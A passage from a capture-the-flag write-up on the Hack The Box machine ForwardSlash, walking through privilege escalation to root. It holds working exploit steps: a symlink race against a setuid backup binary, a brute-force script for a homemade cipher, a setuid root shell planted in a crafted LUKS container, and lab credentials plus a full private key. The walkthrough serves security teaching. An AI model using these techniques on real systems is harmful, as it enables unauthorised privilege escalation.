chiv@forwardslash.htb's password: N0bodyL1kesBack/
backup  100%   13KB 504.0KB/s   00:00
```

We'll download the binary to our Kali machine and import it into `Ghidra`.

![Ghidra import](/assets/images/HTB-ForwardSlash/1.d%20Ghidra%20import.png)

```c
undefined8 main(void)
{
  __uid_t __uid;
  __gid_t __gid;
  int iVar1;
  tm *ptVar2;
  size_t sVar3;
  long in_FS_OFFSET;
  char local_75;
  time_t local_68;
  char *local_60;
  char *local_58;
  FILE *local_50;
  ulong local_48;
  ulong local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  long local_20;
  char *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __uid = getuid();
  __gid = getgid();
  puts(banner);
  local_68 = time((time_t *)0x0);
  ptVar2 = localtime(&local_68);
  local_48 = *(ulong *)ptVar2;
  local_40 = *(ulong *)&ptVar2->tm_hour;
  local_38 = *(undefined8 *)&ptVar2->tm_mon;
  local_30 = *(undefined8 *)&ptVar2->tm_wday;
  local_28 = *(undefined8 *)&ptVar2->tm_isdst;
  local_20 = ptVar2->tm_gmtoff;
  local_18 = ptVar2->tm_zone;
  local_60 = (char *)malloc(0xd);
  sprintf(local_60,"%02d:%02d:%02d",local_40 & 0xffffffff,local_48 >> 0x20,local_48 & 0xffffffff);
  sVar3 = strlen(local_60);
  local_58 = (char *)str2md5(local_60,sVar3 & 0xffffffff,sVar3 & 0xffffffff);
  printf("Current Time: %s\n",local_60);
  setuid(0x3ea);
  setgid(0x3ea);
  iVar1 = access(local_58,0);
  if (iVar1 == -1) {
    printf("ERROR: %s Does Not Exist or Is Not Accessible By Me, Exiting...\n",local_58);
  }
  else {
    local_50 = fopen(local_58,"r");
    if (local_50 == (FILE *)0x0) {
      puts("File cannot be opened.");
    }
    else {
      iVar1 = fgetc(local_50);
      local_75 = (char)iVar1;
      while (local_75 != -1) {
        putchar((int)local_75);
        iVar1 = fgetc(local_50);
        local_75 = (char)iVar1;
      }
      fclose(local_50);
    }
  }
  setuid(__uid);
  setgid(__gid);
  remove(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
```

`Ghidra` has decompiled the main function and we can see that it tries to read a file with filename stored in `local_58` and the error message we got earlier when we ran this application.

```bash
chiv@forwardslash:~$ find / -user pain -ls 2>/dev/null
   132024      4 -rw-------   1 pain     pain          526 Jun 21  2019 /var/backups/config.php.bak
   804211     16 -r-sr-xr-x   1 pain     pain        13384 Mar  6 10:06 /usr/bin/backup
   786635      4 drwxr-xr-x   7 pain     pain         4096 Mar 17 20:28 /home/pain
   787494      0 lrwxrwxrwx   1 pain     root            9 Mar  6 09:43 /home/pain/.bash_history -> /dev/null
   787487      4 drwx------   2 pain     pain         4096 Mar  5 14:22 /home/pain/.cache
   786737      4 -rw-r--r--   1 pain     pain          807 Apr  4  2018 /home/pain/.profile
   804212      4 -rw-------   1 pain     pain           33 Jul  8 07:14 /home/pain/user.txt
   787275      4 drwx------   3 pain     pain         4096 Mar  5 14:22 /home/pain/.gnupg
   787094      4 -rw-r--r--   1 pain     pain         3771 Apr  4  2018 /home/pain/.bashrc
  1192542      4 drwxrwxr-x   3 pain     pain         4096 Mar  6 14:23 /home/pain/.local
  1192543      4 drwx------   3 pain     pain         4096 Mar  6 14:23 /home/pain/.local/share
   787097      4 -rw-r--r--   1 pain     pain          220 Apr  4  2018 /home/pain/.bash_logout
   804214      4 drwx------   2 pain     pain         4096 Mar 17 20:29 /home/pain/.ssh
   400803      4 drwxr-xr-x   2 pain     root         4096 Mar 24 12:06 /home/pain/encryptorinator
   404159      4 -rw-r--r--   1 pain     root          931 Jun  3  2019 /home/pain/encryptorinator/encrypter.py
   404160      4 -rw-r--r--   1 pain     root          165 Jun  3  2019 /home/pain/encryptorinator/ciphertext
   404161      4 -rw-r--r--   1 pain     root          256 Jun  3  2019 /home/pain/note.txt
```

We can see that the user `pain` can read `/var/backups/config.php.bak` while the current `chiv` user can't read this file.

```bash
chiv@forwardslash:~$ filename=$(backup | tail -1 | awk '{print $2}'); ln -s /var/backups/config.php.bak ./$filename; backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:29:33
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Running the backup program is fast so we can do it multiple times in a second. The filename it tries to read is based on the time in seconds so we can use `tail -1` to only get the last line of the output and `awk '{print $2}'` to only get the hash/filename. We use `ln -s` to create a symbolic link resulting in the expected filename to link to `/var/backups/config.php.bak` which can be read by `pain`.

```bash
luc@kali:~/HTB/ForwardSlash$ ssh pain@forwardslash.htb
pain@forwardslash.htb's password: db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 12:35:10 UTC 2020

  System load:  0.0                Processes:            173
  Usage of /:   32.9% of 19.56GB   Users logged in:      1
  Memory usage: 28%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Mar  5 14:22:04 2020 from 192.168.56.1
pain@forwardslash:~$ cat user.txt
8bafa9c8************************
pain@forwardslash:~$ id
uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)
```

### Pain -> root

```bash
pain@forwardslash:~$ ls
encryptorinator  note.txt  user.txt
pain@forwardslash:~$ cat note.txt
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
pain@forwardslash:~$ ls encryptorinator/
ciphertext  encrypter.py
pain@forwardslash:~$ cat encryptorinator/encrypter.py
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
pain@forwardslash:~$ file encryptorinator/ciphertext
encryptorinator/ciphertext: data
pain@forwardslash:~$ xxd encryptorinator/ciphertext
00000000: cbd7 a39b 1a94 2c4c f60a 3e05 bc32 58d5  ......,L..>..2X.
00000010: a20b 8a0d 7c8a 3f00 49c7 29f1 4583 2d97  ....|.?.I.).E.-.
00000020: cb92 5c2f 3bc3 c7b2 79c6 5b77 234d 9215  ..\/;...y.[w#M..
00000030: f732 ca1b d17e 90e7 5912 4027 b6e7 bc98  .2...~..Y.@'....
00000040: 8a85 e6b3 a32c 0588 ebdb f450 99ba 4004  .....,.....P..@.
00000050: 3586 c066 24f9 5c2a 0172 a277 467f ba92  5..f$.\*.r.wF...
00000060: 33b8 67ef 58bf 7dc9 6936 f0b4 8bf4 7edf  3.g.X.}.i6....~.
00000070: 4b8b a959 f0c5 8ea5 91ff 2718 2581 bf65  K..Y......'.%..e
00000080: e01f 3ee0 ae78 dd6f e41f 2b67 dc19 2fb1  ..>..x.o..+g../.
00000090: 4bac 063e ff5e ddcb 56a5 f71d e208 4eb0  K..>.^..V.....N.
000000a0: 6b8a bf65 0a                             k..e.
```

We'll need to find the key to decrypt `ciphertext`.

```bash
luc@kali:~/HTB/ForwardSlash$ mkdir encryptorinator
luc@kali:~/HTB/ForwardSlash$ cd encryptorinator/
luc@kali:~/HTB/ForwardSlash/encryptorinator$ scp pain@forwardslash.htb:/home/pain/encryptorinator/* .
pain@forwardslash.htb's password: db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
ciphertext      100%  165    11.6KB/s   00:00
encrypter.py    100%  931    70.3KB/s   00:00
```

We transfer the `ciphertext` and `encrypter.py` to our local machine.

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


ciphertext = open('ciphertext', 'r').read().rstrip()
with open('/usr/share/wordlists/rockyou.txt', 'r') as passwordFile:
    for password in passwordFile:
        password = password.strip()
        decrypted = decrypt(password, ciphertext)
        if 'the' in decrypted or 'you' in decrypted or 'and' in decrypted:
            print 'Password: ' + password + '\nDecrypted: ' + decrypted
```

We go over the entire `rockyou` wordlist and we print every password and message where `the`, `you` or `and` shows up in the decrypted text because it's quite likely they will only show in valid results.

```bash
luc@kali:~/HTB/ForwardSlash/encryptorinator$ python encrypter.py
Password: teamareporsiempre
Decrypted: H[2fv/vXLlyyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
Password: the rock you team
Decrypted: HZYRK`}jyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
...
```

Running this brute force code gives multiple results and shows the dangers of using your own crypto instead of tested libraries. We now have a password to decrypt an encypted image in the `/var/backups/recovery/` directory.

```bash
pain@forwardslash:~$ ls /var/backups/recovery/
encrypted_backup.img
pain@forwardslash:~$ file /var/backups/recovery/encrypted_backup.img
/var/backups/recovery/encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

`/var/backups/recovery/encrypted_backup.img` is a LUKS encrypted file and `pain` can run 3 commands as root.

```bash
pain@forwardslash:~$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf
pain@forwardslash:~$ mkdir mnt
pain@forwardslash:~$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:~$ ls mnt/
id_rsa
pain@forwardslash:~$ base64 mnt/id_rsa -w 0;echo
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBOWkvcjhWR29mMXZwSVY2cmhORTloWmZCRGQzdTZTMTZ1TllxTG4reEZnWkVRQlpLClJLaCtXRHlrdi9ndWt2VVNhdXhXSm5kUHEzRjFDazB4YmNHUXU2KzFPQlliK2ZRMEI4cmFDUmp3dHdZRjRnYWYKeUxGY09TMTExbUttVUlCOXFSMXdEc21LUmJ0V1BQUHZnczJydWFmZ2VpSHVqSUVraVVVazlmM1dUTnFVc1BRYwp1MkFHLy9aQ2lxS1djV24wQ2NDMkVoV3NSUWhMT3ZoM3BHZnY0Z2cwR2cvVk5OaU1QakRBWW5yNGlWZzRYeUV1Ck5XUzJ4OVB0UGFzV3NXUlBMTUVQdHpMaEpPbkhFM2lWSnVUbkZGaHAyVDZDdG1adWk0VEpIM3BpajZ3WVlpczkKTXF6VG1Gd056engySEtTMnRFMnR5MmMxQ2NXK0YzR1Mvcm4wRVFJREFRQUJBb0lCQVFDUGZqa2c3RDZ4RlNwYQpWK3JUUEg2R2VvQjlDNm13WWVEUkVZdCtsTkRzREhVRmdiaUNNaytLTUxhNmFmY0RrekxML2JydEtzZldId2hnCkc4USt1LzhYVm4vakZBZjBkZUZKMVhPbXI5SEdiQTFMeEI2b0JMRERadnJ6SFliaER6T3ZPY2hSNWlqaElpTk8KM2NQeDB0MVFGa2lpQjFzYXJEOVdmMlhldDdpTURBckpJOTRHN3lmbmZVZWd0QzV5MzhsaUpkYjJUQlh3dklaQwp2Uk9YWmlRZG1XQ1BFbXd1RTBhRGo0SHFtSnZuSXg5UDRFQWNUV3VZMExkVVUzelpjRmdZbFhpWVQweGcyTjFwCk1JckFqamhnclEzQTJrWHl4aDlwenhzRmx2SWFTZnhBdnNMOExReTJPc2wraTgwV2FPUnlrbXlGeTVybU5MUUQKSWgwY2l6YjlBb0dCQVAyK1BEMm5WOHkyMGtGNlUwK0psd01HN1diVi9yREY2K2tWbjBNMnNmUUtpQUlVSzNXbgo1WUNlR0FSck1kWnI0ZmlkVE43a29rZTAyTTRlblNIRWRaUlRXMmpSWGxLZllIcVNvVnpMZ2duS1ZVL2VnaFFzClY0Z3Y2K2NjNzg3SG9qdHVVN0VlNjZlV2owVlNyMFBYakZJbnpkU2RtbmQ5M29EWlB6d0Y4UVVuQW9HQkFQaGcKZTFWYUhHODlFNFlXTnhiZnI3Mzl0NXFQdWl6UEpZN2ZJQk92OVowRytQNUtDdEhKQTV1eHBFTHJGM2hRakpVOAo2T3J6LzBDK1R4bWxUR1ZPdmtRV2lqNEdDOXJjT01hUDAzelhhbVFUU0dOUk9NK1MxSTlVVW9RQnJ3ZTJuUWVoCmkyQi9BbE80UHJPSEp0ZlNYSXpzZWRtRE5Mb01xTzUvbi94QXFMQUhBb0dBVG52OENCbnR0MTFKRllXdnBTZHEKdFQzOFNsV2dqSzc3ZEVJQzIvaGIvSjhSU0l0U2tmYlhydnUzZEE1d0FPR25xSTJIREY1dHIzNUpuUitzL0pmVwp3b1V4L2U3Y25QTzlGTXlyNnBicjV2bFZmL25VQkVkZTM3bnEzclo5bWxqM1hpaVc3RzhpOXRoRUFtNDcxZUVpCi92cGUyUWZTa21rMVhHZFYvc3ZicS9zQ2dZQVo2RloxRExVeWxUaFlJREVXM2JaREp4ZmpzMkpFRWtka283bUEKMURYV2IwZkJubytLV21GWitDbWVJVStOYVRtQXg1MjBCRWQzeFdJUzFyOGxRaFZ1bkx0R3hQS3ZuWkQraFRvVwpKNUlkWmpXQ3hwSWFkTUpmUVBocWRKS0JSM2NSdUxRRkdMcHhhU0tCTDNQSngxT0lENUtXTWExcVNxL0VVT09yCk9FTmdPUUtCZ0QvbVlnUFNtYnFwTlpJMC9CKzZ1YTlrUUpBSDZKUzQ0dit5RmtIZk5UVzBNN1VJalU3d2tHUXcKZGRNTmpocHdWWjMvL0c2VWhXU29qVVNjUVRFUkFOdDhSK0o2ZFIwWWZQekhuc0RJb1JjN0lBQlFteHh5Z1hEbwpab1lEemxQQWx3Sm1vUFFYYXVSbDFDZ2pseUhyVlVUZlMwQWtRSDJaYnF2SzUvTWV0cThvCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==
```

```bash
luc@kali:~/HTB/ForwardSlash$ echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBOWkvcjhWR29mMXZwSVY2cmhORTloWmZCRGQzdTZTMTZ1TllxTG4reEZnWkVRQlpLClJLaCtXRHlrdi9ndWt2VVNhdXhXSm5kUHEzRjFDazB4YmNHUXU2KzFPQlliK2ZRMEI4cmFDUmp3dHdZRjRnYWYKeUxGY09TMTExbUttVUlCOXFSMXdEc21LUmJ0V1BQUHZnczJydWFmZ2VpSHVqSUVraVVVazlmM1dUTnFVc1BRYwp1MkFHLy9aQ2lxS1djV24wQ2NDMkVoV3NSUWhMT3ZoM3BHZnY0Z2cwR2cvVk5OaU1QakRBWW5yNGlWZzRYeUV1Ck5XUzJ4OVB0UGFzV3NXUlBMTUVQdHpMaEpPbkhFM2lWSnVUbkZGaHAyVDZDdG1adWk0VEpIM3BpajZ3WVlpczkKTXF6VG1Gd056engySEtTMnRFMnR5MmMxQ2NXK0YzR1Mvcm4wRVFJREFRQUJBb0lCQVFDUGZqa2c3RDZ4RlNwYQpWK3JUUEg2R2VvQjlDNm13WWVEUkVZdCtsTkRzREhVRmdiaUNNaytLTUxhNmFmY0RrekxML2JydEtzZldId2hnCkc4USt1LzhYVm4vakZBZjBkZUZKMVhPbXI5SEdiQTFMeEI2b0JMRERadnJ6SFliaER6T3ZPY2hSNWlqaElpTk8KM2NQeDB0MVFGa2lpQjFzYXJEOVdmMlhldDdpTURBckpJOTRHN3lmbmZVZWd0QzV5MzhsaUpkYjJUQlh3dklaQwp2Uk9YWmlRZG1XQ1BFbXd1RTBhRGo0SHFtSnZuSXg5UDRFQWNUV3VZMExkVVUzelpjRmdZbFhpWVQweGcyTjFwCk1JckFqamhnclEzQTJrWHl4aDlwenhzRmx2SWFTZnhBdnNMOExReTJPc2wraTgwV2FPUnlrbXlGeTVybU5MUUQKSWgwY2l6YjlBb0dCQVAyK1BEMm5WOHkyMGtGNlUwK0psd01HN1diVi9yREY2K2tWbjBNMnNmUUtpQUlVSzNXbgo1WUNlR0FSck1kWnI0ZmlkVE43a29rZTAyTTRlblNIRWRaUlRXMmpSWGxLZllIcVNvVnpMZ2duS1ZVL2VnaFFzClY0Z3Y2K2NjNzg3SG9qdHVVN0VlNjZlV2owVlNyMFBYakZJbnpkU2RtbmQ5M29EWlB6d0Y4UVVuQW9HQkFQaGcKZTFWYUhHODlFNFlXTnhiZnI3Mzl0NXFQdWl6UEpZN2ZJQk92OVowRytQNUtDdEhKQTV1eHBFTHJGM2hRakpVOAo2T3J6LzBDK1R4bWxUR1ZPdmtRV2lqNEdDOXJjT01hUDAzelhhbVFUU0dOUk9NK1MxSTlVVW9RQnJ3ZTJuUWVoCmkyQi9BbE80UHJPSEp0ZlNYSXpzZWRtRE5Mb01xTzUvbi94QXFMQUhBb0dBVG52OENCbnR0MTFKRllXdnBTZHEKdFQzOFNsV2dqSzc3ZEVJQzIvaGIvSjhSU0l0U2tmYlhydnUzZEE1d0FPR25xSTJIREY1dHIzNUpuUitzL0pmVwp3b1V4L2U3Y25QTzlGTXlyNnBicjV2bFZmL25VQkVkZTM3bnEzclo5bWxqM1hpaVc3RzhpOXRoRUFtNDcxZUVpCi92cGUyUWZTa21rMVhHZFYvc3ZicS9zQ2dZQVo2RloxRExVeWxUaFlJREVXM2JaREp4ZmpzMkpFRWtka283bUEKMURYV2IwZkJubytLV21GWitDbWVJVStOYVRtQXg1MjBCRWQzeFdJUzFyOGxRaFZ1bkx0R3hQS3ZuWkQraFRvVwpKNUlkWmpXQ3hwSWFkTUpmUVBocWRKS0JSM2NSdUxRRkdMcHhhU0tCTDNQSngxT0lENUtXTWExcVNxL0VVT09yCk9FTmdPUUtCZ0QvbVlnUFNtYnFwTlpJMC9CKzZ1YTlrUUpBSDZKUzQ0dit5RmtIZk5UVzBNN1VJalU3d2tHUXcKZGRNTmpocHdWWjMvL0c2VWhXU29qVVNjUVRFUkFOdDhSK0o2ZFIwWWZQekhuc0RJb1JjN0lBQlFteHh5Z1hEbwpab1lEemxQQWx3Sm1vUFFYYXVSbDFDZ2pseUhyVlVUZlMwQWtRSDJaYnF2SzUvTWV0cThvCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==' | base64 -d > id_rsa
luc@kali:~/HTB/ForwardSlash$ chmod 600 id_rsa
luc@kali:~/HTB/ForwardSlash$ ssh -i id_rsa root@forwardslash.htb
load pubkey "id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 13:37:18 UTC 2020

  System load:  0.0                Processes:            193
  Usage of /:   32.9% of 19.56GB   Users logged in:      1
  Memory usage: 29%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
root@forwardslash:~# id
uid=0(root) gid=0(root) groups=0(root)
root@forwardslash:~# cat /root/root.txt
0f94634e************************
```

## TL;DR

- File inclusion shows source code and credentials
- User can run custom application as another user resulting in config file with credentials
- Brute force encryption results in key which decrypts file containing root id_rsa

## Bonus

### Unintended root from pain

It's possible to create a luks encrypted file with a setuid binary which will give us `root` access on the machine from the `pain` account.

```bash
luc@kali:~/HTB/ForwardSlash$ mkdir luks
luc@kali:~/HTB/ForwardSlash$ cd luks/
luc@kali:~/HTB/ForwardSlash/luks$ dd if=/dev/zero of=container.luks bs=1M count=25
25+0 records in
25+0 records out
26214400 bytes (26 MB, 25 MiB) copied, 0.049814 s, 526 MB/s
luc@kali:~/HTB/ForwardSlash/luks$ xxd container.luks
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
...
018fffc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
018fffd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
018fffe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
018ffff0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

We create an empty 25MG file.

```bash
luc@kali:~/HTB/ForwardSlash/luks$ sudo cryptsetup luksFormat container.luks

WARNING!
========
This will overwrite data on container.luks irrevocably.

Are you sure? (Type 'yes' in capital letters): YES
Enter passphrase for container.luks: password
Verify passphrase: password
luc@kali:~/HTB/ForwardSlash/luks$ sudo cryptsetup luksOpen container.luks exploit
Enter passphrase for container.luks: password
luc@kali:~/HTB/ForwardSlash/luks$ sudo mkfs.ext4 /dev/mapper/exploit
mke2fs 1.45.6 (20-Mar-2020)
Creating filesystem with 9216 1k blocks and 2304 inodes
Filesystem UUID: f8fb641a-7e84-4ff5-9ad7-b40fb70598ba
Superblock backups stored on blocks:
        8193

Allocating group tables: done
Writing inode tables: done
Creating journal (1024 blocks): done
Writing superblocks and filesystem accounting information: done
luc@kali:~/HTB/ForwardSlash/luks$ sudo mount /dev/mapper/exploit /mnt
```

We've now created the file system and mounted it on our local machine.

```bash
luc@kali:~/HTB/ForwardSlash/luks$ nano setuid.c
int main(void) {
  setgid(0); setuid(0);
  execl("/bin/sh","sh",0);
}
luc@kali:~/HTB/ForwardSlash/luks$ sudo gcc setuid.c -o setuid
luc@kali:~/HTB/ForwardSlash/luks$ ./setuid
$ id
uid=1000(luc) gid=1000(luc) groups=1000(luc),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),133(scanner)
$ exit
luc@kali:~/HTB/ForwardSlash/luks$ sudo chmod 4755 setuid
luc@kali:~/HTB/ForwardSlash/luks$ ./setuid
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),133(scanner),1000(luc)
# exit
luc@kali:~/HTB/ForwardSlash/luks$ sudo cp setuid /mnt/
luc@kali:~/HTB/ForwardSlash/luks$ sudo chmod 4755 /mnt/setuid
```

We've created an application that executes `/bin/sh` as root and we've copied that to `/mnt`.

```bash
luc@kali:~/HTB/ForwardSlash/luks$ sudo umount /mnt
luc@kali:~/HTB/ForwardSlash/luks$ sudo cryptsetup luksClose exploit
luc@kali:~/HTB/ForwardSlash/luks$ file container.luks
container.luks: LUKS encrypted file, ver 2 [, , sha256] UUID: bd8ea3ab-cd8f-4307-b649-e592af8b1e8b
```

Now `container.luks` is an encrypted file with our `setuid` binary.

```bash
luc@kali:~/HTB/ForwardSlash/luks$ scp container.luks pain@forwardslash.htb:/home/pain/
pain@forwardslash.htb's password: db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
container.luks  100%   25MB   7.6MB/s   00:03
```

```bash
pain@forwardslash:~$ ls
container.luks  encryptorinator  mnt  note.txt  user.txt
pain@forwardslash:~$ sudo /sbin/cryptsetup luksOpen container.luks backup
Enter passphrase for container.luks: password
pain@forwardslash:~$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:~$ ls mnt/
lost+found  setuid
pain@forwardslash:~$ mnt/setuid
# id
uid=0(root) gid=0(root) groups=0(root),1000(pain),1002(backupoperator)
# wc /root/root.txt
 1  1 33 /root/root.txt
```

This way we get `root` on the machine without having to deal with the encryption.
